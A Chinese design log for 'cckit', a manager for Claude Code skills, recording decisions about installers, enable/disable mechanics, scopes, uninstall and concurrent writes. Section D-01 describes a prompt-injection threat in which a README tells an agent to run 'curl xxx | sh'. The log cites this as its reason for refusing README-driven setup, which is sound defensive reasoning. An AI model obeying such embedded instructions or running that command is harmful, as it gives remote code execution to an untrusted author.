# 设计日志:从初始构想到定稿

本文档记录方案的演化过程——**哪些想法被保留、哪些被改、哪些被否决,以及为什么**。

写它的理由:后续开发者如果不知道某个约束是为了绕开什么坑,很容易"顺手优化掉它",
然后重新踩一遍。**每次想改动一条设计时,先来这里看它当初为什么这样定。**

---

## 初始构想

项目发起人的原始设想(7 点):

1. 两个关键点:自动化安装 skill 所需环境 + skill 的组织与管理
2. 环境安装两方面结合:
   **A.** 要求 kit 满足某种格式(必填元数据、README 环境配置完善性),配套脚本检查合法性
   **B.** 整个自动化过程由 CC 接手,根据必要信息自行配置环境
3. 组织管理:总控 Skill/脚本 + 配置文件/数据库。每次调用 skill 先走总控,
   由它判断是否被禁用。启停 = 改配置。卸载 = 直接删 skill 文件夹
4. 作用域:希望全局和单项目都可用,但不确定怎么做
5. 两套格式:单独工作的 skill 用一套,需要协作的 skill 集合用另一套
6. 要体现"工具箱感",供 CC 自行取用
7. 征求意见与可深入的方向

## 结论速览

| 初始想法 | 结论 | 记录 |
|---|---|---|
| 两个关键点的判断 | ✅ **完全正确**,且有硬证据支撑 | [01](01-overview.md) |
| 2A 声明式格式 + 脚本校验 | 🔧 方向对,载体从 README 改为 manifest | D-06 |
| 2B CC 读 README 自行配环境 | ❌ **否决**,安全风险 | D-01 |
| 3 总控 skill 拦截调用 | ❌ 机制不成立,但需求真实,以别的形式实现 | D-03 / D-04 |
| 3 卸载 = 删文件夹 | 🔧 有环境后不成立 | D-07 |
| 4 全局 + 项目双作用域 | ✅ 保留,方案已定 | D-09 |
| 5 两套格式 | 🔧 合并为一套 | D-05 |
| 6 工具箱感 | ✅ 现有架构已是,增值点在别处 | D-03 |

发起人对"环境安装"和"组织管理"是两个核心难点的判断,后来被实测证据强力印证:
官方 marketplace 中带依赖文件的插件数量为 **0**,而这不是生态问题,是平台设计上的禁止。
详见 [01-overview.md](01-overview.md)。

---

## D-01 环境安装:确定性 installer,而非 CC 读 README

**初始构想**:由 CC 接手整个自动化配置过程,根据 kit 提供的信息(含 README)自行配环境。

**最终方案**:manifest 声明依赖 → 确定性 installer 执行(**不碰 LLM**)→ 仅当失败时,
把结构化错误日志交给 CC 做**诊断**。

**为什么改**:

README 由 kit 作者控制。把它交给一个有 Bash 权限的 agent"照着做",等于把任意代码
执行权移交给作者。作者写一句"配置前请先运行 `curl xxx | sh`",CC 就会照做。
这是教科书级的 prompt injection + RCE,而且是我们主动搭的通道。

三个次要问题:

- **不可复现**:同一 kit 在不同机器上可能装出不同结果
- **无法卸载**:不知道装了什么,就不知道该删什么
- **成本**:每装一个 kit 烧一次 LLM 调用

正确分工是:**确定性流程交给代码,长尾报错交给 LLM。** 后者才是 LLM 真正的增值点——
执行标准流程不是。

**证据**:官方插件系统面对同一问题时强制 `--ignore-scripts`,并声明
"no code from the plugin or its packages executes during it"。他们也认为这条路危险。

---

## D-02 系统级依赖:只声明、只检查,绝不自动装

**最终方案**:`requires.system` 只声明 + 检查存在性 + 给**当前平台**的安装 hint。

**为什么**:

- `sudo apt install` 需要提权,是横向扩大攻击面的最佳跳板
- **无法干净卸载**——别的东西可能也依赖它
- 跨发行版包名不一致,猜错会装上错误的包

配套硬约束:**postinstall 只允许操作 kit 自己的目录**。任何系统级操作必须改为
`requires.system` 声明。这既是安全要求,也是可卸载性的前提——cckit 只能清理它知道的东西。

---

## D-03 开关机制:link + skillOverrides 四态(改动最大的一条)

**初始构想**:总控 skill / 脚本 + 配置文件。每次调用 skill 先走总控,由它判断是否被禁用。

**最终方案**:link 决定"哪些作用域能扫到",`skillOverrides` 决定"扫到之后什么状态"。
两者**正交**,组合成四态。

**为什么改**:

**总控拦截这个机制不成立。** skill 的触发是**模型自主决策**的:CC 在会话启动时把所有
skill 的 description 加载进上下文,然后自己决定调哪个。不存在统一的"调用入口"给脚本拦截,
CC 也没有义务先去问总控。hook 事件列表里**没有 skill 专用钩子**。

真正的开关是**物理可见性**:禁用 = 让 description 根本不进上下文。

**实测验证**:在 `.claude/skills/` 下建 junction 指向别处的真实 skill,CC 完整发现了它
并读到了埋在 description 里的标记词。**CC 侧零改动。** 这是整个架构的可行性前提。

### ⚠️ 中途的判断失误(重要)

分析过程中我曾断言"CC 没有 skill 粒度开关键,拿不到你要的能力"。**这是错的**——
我搜的键名(`disabledSkills` / `enabledSkills`)不存在,但真实的键叫 **`skillOverrides`**,
它有四档:`on` / `name-only` / `user-invocable-only` / `off`。

修正后发现结论比原判断**更好**:

- `skillOverrides` **对 plugin skill 无效**,只作用于 personal / project skill;
- 而 link 方案产出的正是 personal / project skill。

所以选定 link 架构后,恰好落在 `skillOverrides` 唯一生效的层上。这不是巧合带来的运气,
但也确实是选对架构后白拿的红利。

`name-only` 是我原本完全没想到的第三态:CC 知道工具存在、用户可 `/skill-name` 手动调用,
但 description 不占清单预算。它让"腾预算"从抽象问题变成一个可执行动作(见 D-12)。

**代价(必须记录)**:走 `skillOverrides` 意味着 cckit 要写 CC 的 `settings.json`,
这与"独立体系、不碰 CC 配置"的初衷有张力。取舍理由:它是**文档化的公开用户配置键**,
不是插件系统的内部状态,且是官方为 personal skill 提供的**唯一**粒度开关。
判断为值得。若日后 CC 变更此键,退路是纯 link 方案(失去 `name-only` 一档)。

---

## D-04 拦截点:以 `cckit exec` 的形式复活

**初始构想**:总控脚本拦截每次 skill 调用。

**最终方案**:D-03 否决了"拦截开关",但**拦截这个需求本身是真实的**,它在
`cckit exec` 上真正落地了。

`cckit exec <skill> <script>` 是 skill 脚本的统一入口(存在的首要理由是解决"脚本怎么找到
自己的 venv"这个跨平台问题)。顺带地,cckit 在这里可以:校验启用状态、记录用量、注入环境变量。

**为什么这个拦截是可靠的,而总控不可靠**:脚本**必须**经过 `exec` 才能找到自己的解释器,
这是物理必然;而"CC 自觉去问总控"只是期望。

**局限**:只覆盖带脚本的 skill。纯 prompt skill 无脚本,其开关仍靠可见性。

**另一条路(备选)**:`PreToolUse` 能匹配 `Skill` 工具,但用户打 `/skillname` 会绕过它;
要覆盖两条路径需 `PreToolUse` + `UserPromptExpansion` 并用。这套适合做**用量统计**,
不适合做开关——到那一步 description 已经占了预算、模型已经做了决定,太晚。

---

## D-05 kit 格式:合并为一套

**初始构想**:两套格式——单独工作的 skill 一套,需要协作的 skill 集合另一套。

**最终方案**:一个仓库 = 一个 kit,含 1..N 个 skill。**单个 skill 只是 N=1 的特例。**

**为什么改**:两套格式意味着两条代码路径、两套 schema、两倍边界情况,而**用户体验不受影响**
——因为开关粒度本来就在 skill 层,不在 kit 层。

skill 间的协作关系用 manifest 表达(`needs` 声明依赖),不需要独立的"集合格式"。

---

## D-06 manifest 载体:YAML 文件,而非 README 散文

**初始构想**:要求 README 的"环境配置完善性",配套脚本检查。

**最终方案**:声明式 `cckit.yaml` + JSON Schema 校验。README 照旧写给人看,机器只读 manifest。

**为什么改**:README 是散文,**机器无法验证"完善性"**。改成 manifest 后,
"是否合法"变成确定性判断,而不是主观评估(或者更糟——让 LLM 去做主观评估)。

**格式为什么选 YAML 而非 JSON**:依赖项常需注释说明"为什么要这个包",JSON 不支持注释。

**为什么不是 TOML**:TOML 也支持注释,且 Python 3.11+ 有 stdlib `tomllib`(省一个依赖)。
选 YAML 是为了生态一致性——SKILL.md frontmatter、CI 配置都是 YAML,kit 作者更熟。
校验仍走 JSON Schema,严谨性不受格式选择影响。

---

## D-07 卸载:必须跟踪安装产物

**初始构想**:"CC 的 skill 组织很规整,直接删这个 skill 的文件夹就好。"

**最终方案**:`cckit remove` 依次清理 link → env → store → registry →
`skillOverrides` 残留条目。

**为什么改**:这个判断在**没有环境**时是对的。但引入 venv 后,产物散布在多处:
env 在 `~/.cckit/envs/`,状态在 `registry.json` 与 CC 的 `settings.json`。
删 skill 目录只删掉了最表层的一份。

这条与 D-02 的约束互为因果:**正因为要保证可卸载,postinstall 才不能碰自己目录之外的东西。**

---

## D-08 跨平台:两次 Windows-only 失误

发起人明确要求"不要弄成只支持 Windows"。这个提醒抓得准——**此时草案里已经有两处
Windows-only 错误**,都是我犯的:

### 失误一:建议用 `os.rmdir()` 删链接

我基于 Windows 实测给出"删除用 `os.rmdir()`,不要用 `shutil.rmtree()`"。
`rmdir` 在 Windows 上确实能删 junction,但在 **Linux 上删 symlink 抛
`NotADirectoryError`(errno=20)**。照此实现,`cckit disable` 在 Linux 上会直接报错。

**修正**:统一用 `os.unlink()`,两平台皆可。

### 失误二:manifest 里写了 winget-only 的 hint

草案原文:`system: [{ bin: ffmpeg, hint: "winget install ffmpeg" }]`。
Linux 用户看到这条提示只能干瞪眼。

**修正**:`hint` 强制为分平台 map,schema 层面禁止单字符串;并新增 kit 级
`platforms` 字段,当前平台不匹配时在 `add` 阶段就拒绝,而非装完才发现跑不了。

### 共同的教训

**单平台经验会伪装成通用知识。** 两次失误都不是粗心,是"在 Windows 上验证过所以确信"。

对策:`link.py` 写完后在 Windows 与 WSL Ubuntu 上跑**同一份**测试(5 项断言,双平台全过),
而不是在一个平台上验证后推断另一个。
[06-platform-findings.md](06-platform-findings.md) 因此只记录**实际跑过**的结论。

顺带查明:Windows 上 symlink 需要管理员权限、junction 不需要——这决定了 Windows 必须用
junction,否则用户每次 `enable` 都要提权。多数工具会错用 symlink。

---

## D-09 作用域:store 全局唯一,启用状态分作用域

**初始构想**:希望全局和单项目都可用,但不确定怎么做。

**最终方案**:store 全局唯一一份(不重复下载、不重复装环境);link 分别建到全局或项目的
skills 目录;项目级 `skillOverrides` 写 `settings.local.json`。

**为什么项目级写 `settings.local.json` 而非 `settings.json`**:后者会被提交,
而"我本机关掉这个 skill"是个人偏好,不该强加给同事。团队共享的意图由 `cckit.lock` 承载
(它才是该提交的东西,角色类似 `package.json`)。

**⚠️ 反直觉的坑**:skill 同名冲突时优先级是 **enterprise > personal > project**,
即**全局覆盖项目**。这与 settings 的优先级方向(项目 > 用户)**相反**。
后果是项目里放的改良版 skill 不生效且无提示,因此 `add --project` 必须检测并警告。

---

## D-10 技术栈:Python + uv

**过程**:我推荐 Node + TypeScript,主要理由是 `fs.symlink(target, path, 'junction')`
在 Windows 上原生就能建 junction,无需外部调用。发起人选择 Python + uv,理由是
Python skill 反正需要 uv,栈统一。

**结果:发起人的选择成本比我预估的低。** 实测 `_winapi.CreateJunction` 在标准库里就有
(Python 3.13.12 验证可用),不需要 subprocess 调 `mklink`——我在选项里写的
subprocess 方案是多余的。

保留的代价:`_winapi` 是 CPython 私有 API。已在 `link.py` 加 `mklink /J` 兜底。
Python 下限定为 **3.12+**(`os.path.isjunction()` 的引入版本)。

---

## D-11 分发:`uv tool install`

**提出的问题**:"cckit 本身的安装会不会很复杂?"——安装摩擦直接决定采用率,是个真问题。

**最终方案**:`uv tool install cckit`,并提供一键脚本自动 bootstrap `uv`。

**关键论证**:`uv` 不是为装 cckit 额外付的成本,它本来就是硬依赖——cckit 要给每个 skill
建 venv,还要处理"kit 要 Python 3.11 但用户只有 3.13"的情况。

**`pip install` 为什么出局**:实测 WSL Ubuntu 存在
`/usr/lib/python3.14/EXTERNALLY-MANAGED`,PEP 668 生效,`pip install --user` 被系统拒绝,
需要 `--break-system-packages` 绕过。让用户输入"break system packages"作为安装指令,
不可接受。

**意外的好消息**:实测 `~/.local/bin` 已在 Windows User PATH 中(`claude` 自身即装于此),
正是 `uv tool install` 的目标位置——装完即用,无需改 PATH 或重开终端。
且用户**无需预装 Python**,`uv` 会自己拉。详见 [08-installation.md](08-installation.md)。

---

## D-12 新增约束:skill 清单预算(初始构想完全没有覆盖)

这一条不在任何人的初始设想里,是查文档时才发现的**设计级约束**:

- 会话启动只加载 skill 的**名字 + description 清单**;
- 清单预算 = **模型上下文窗口的 1%**;
- 超预算时**名字保留,description 从"最少被调用"的开始丢弃**。

**为什么这条重要**:工具箱做大之后,新装 skill 的 description 可能根本没进上下文。
CC 看得到名字但不知道何时该用它,表现为"装了但 CC 从来不用",而且**不报错、无提示**。
这是能让人 debug 一整天的问题——而它恰恰是"工具箱越好用、装得越多"之后必然遇到的。

**引出的功能**:`cckit list` / `add` 报预算占用;`name-only` 档作为腾预算的手术刀;
安装时 lint description(含与已装 skill 的语义重叠检测)。

这也回答了初始构想第 6 点"工具箱感还能优化什么":现有架构确实已经是工具箱了,
真正的增值不在重新设计发现机制,而在**保证 CC 能正确挑到工具**——预算管理与
description 质量才是瓶颈。

---

## D-13 启用状态:派生而非存储

**提出的质疑**:为什么不把启用状态集中放进数据库或配置文件?后期要用 Web 管理开关
(list + 逐个开关),扫描式查询方便吗?

**最终方案**:保持派生。启用状态从文件系统 + `settings.json` 现场读取,不落库。

**为什么**:

CC 只看两处——`skills/` 目录里有什么、`skillOverrides` 写了什么。**它不知道 cckit 存在。**
若把状态存进数据库,数据库说 `enabled` 而 link 不存在时,CC 不会加载,
**数据库说的话没人听**。它不是真相来源,只是可能过期的副本。

而且漂移是必然:用户手动删目录、自己编辑 `skillOverrides`、`git pull` 到同事的改动、
CC 升级、cckit 在两次写入之间崩溃——全是合法情况。存了之后仍需 `reconcile` 且必须以
文件系统为准,那不如一开始就直接读。

**性能顾虑已实测排除**:200 个 skill 的完整扫描中位 **6.7 ms**,Web 请求里无感。

**但质疑中的真问题被采纳了**:原设计确实缺一层。Web 不该直接碰文件系统,
否则会出现两套扫描逻辑、两处并发漏洞。因此新增 `cckit.state` 作为唯一状态读写模块,
CLI 与 Web 共用。见 [09-state-api.md](09-state-api.md)。

**划分判据**:能否从文件系统观测出来。观测不到的(kit 版本、sha、env 路径、用量统计)
存 `registry.json`;观测得到的(启用状态)不存。

---

## D-14 并发写:文件锁 + 原子替换(Web 接入的真实风险)

**背景**:D-13 讨论中发现,"状态存哪"其实不是 Web 接入的主要风险,**并发写才是**。

**实测**:8 个进程并发对 `settings.json` 做 read-modify-write——

```
无锁 → 8 条改动只活下来 1 条(丢了 7 条)
加锁 → 8 条完整保留
```

Web 下极易触发:快速连点几个开关,或一边点网页一边跑 CLI。
表现为**"我明明关了它,刷新后又开着"**,极难复现定位。

**关键认识:换数据库救不了这个问题。** 最终仍要写 `settings.json`(CC 只读它),
数据库只会多一个写入点和一处可能不一致的地方。所以正确方向是加锁与原子写,不是换存储。

**最终方案**:`set_state()` 三条硬要求——

1. 文件锁:`os.open(lock, O_CREAT|O_EXCL|O_WRONLY)`,跨平台原子,无需
   `fcntl` / `msvcrt` 分支(已实测)
2. 原子替换:写临时文件 + `os.replace()`。直接覆写若中途崩溃会留下半截 JSON,
   **CC 将完全无法读 settings**
3. 只改 `skillOverrides` 键,其余用户配置原样保留

---

## 我的判断失误汇总

集中列出,便于后续开发者校准对本文档其余部分的信任度:

| # | 失误 | 性质 | 修正处 |
|---|---|---|---|
| 1 | 断言"无 skill 粒度开关" | 搜错键名(实为 `skillOverrides`) | D-03 |
| 2 | 建议 `os.rmdir()` 删链接 | Windows-only 经验当通用知识 | D-08 |
| 3 | manifest 写 winget-only hint | 同上 | D-08 |
| 4 | 完全漏掉清单预算约束 | 设计级遗漏,非细节 | D-12 |
| 5 | 建议 subprocess 调 `mklink` | 多余(标准库已有) | D-10 |
| 6 | 未抽出状态读写层 | 架构层遗漏,被 Web 需求问出来 | D-13 |
| 7 | 未考虑并发写 | 遗漏,且是 Web 下最难定位的一类 bug | D-14 |

前三条的共同点:**"我验证过"和"我搜过但没找到"都会伪装成确定性。**
对策是[06](06-platform-findings.md)只记录实跑结论,并保留"待验证清单"。

---

## 待重审的决策

以下决策当时有明确理由,但值得在特定信号出现时重新评估:

| 决策 | 重审信号 |
|---|---|
| `disable` 默认写 `skillOverrides` | 若 CC 变更或废弃该键 → 退回纯 link 方案 |
| 每 skill 一个独立 venv | 若实测磁盘占用超预期(uv 有全局缓存,应可控) |
| 启用状态不加缓存 | 若 skill 数量级远超 200 且扫描成为瓶颈;只改 `state.py` 内部 |
| manifest 用 YAML | 若最终能做到零第三方依赖,`tomllib` 可省一个依赖 |
| 同名冲突仅警告 | 若实际使用中频繁踩到 → 考虑命名空间,但会破坏"name 必须等于目录名" |
| 不做真实沙箱 | 若出现恶意 kit 案例 → 重新评估代价 |
